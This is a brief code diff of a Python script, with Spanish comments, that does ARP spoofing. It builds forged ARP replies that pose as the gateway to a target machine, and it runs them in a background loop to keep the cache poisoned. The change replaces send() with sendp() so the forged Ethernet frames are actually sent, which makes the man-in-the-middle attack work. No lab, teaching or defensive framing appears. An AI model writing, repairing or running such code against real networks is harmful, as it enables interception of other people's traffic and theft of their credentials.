@@ -6,7 +6,7 @@ import threading
 def arp_spoofing(targetIP, targetMAC, gatewayIP):
     """Envía paquetes ARP falsos continuamente para el envenenamiento."""
     paquete = Ether(dst=targetMAC) / ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=gatewayIP)
-    send(paquete, verbose=False)
+    sendp(paquete, verbose=False)
 
 def start_arp_spoof(targetIP, targetMAC, gatewayIP):
     """Bucle en segundo plano para mantener el ARP Spoofing activo."""
